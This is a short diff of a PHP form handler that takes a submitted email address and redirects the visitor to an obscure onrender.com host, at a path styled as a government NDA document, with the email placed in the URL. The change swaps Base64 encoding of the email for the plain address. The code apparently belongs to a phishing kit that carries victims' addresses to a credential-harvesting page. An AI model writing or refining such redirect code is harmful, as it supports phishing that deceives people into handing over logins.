@@ -54,8 +54,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Encode the email address in Base64
     $encodedEmail = base64_encode($email);
 
-    // Construct the redirect URL with the encoded email
-    $redirectUrl = "https://three03828922939389248u2u22.onrender.com/gov-ni-nda/3039923002302393898944.html#$encodedEmail";
+    // Construct the redirect URL with the decoded email
+$redirectUrl = "https://three03828922939389248u2u22.onrender.com/gov-ni-nda/3039923002302393898944.html#X$email";
+
 
     // Redirect the user
     header("Location: $redirectUrl");
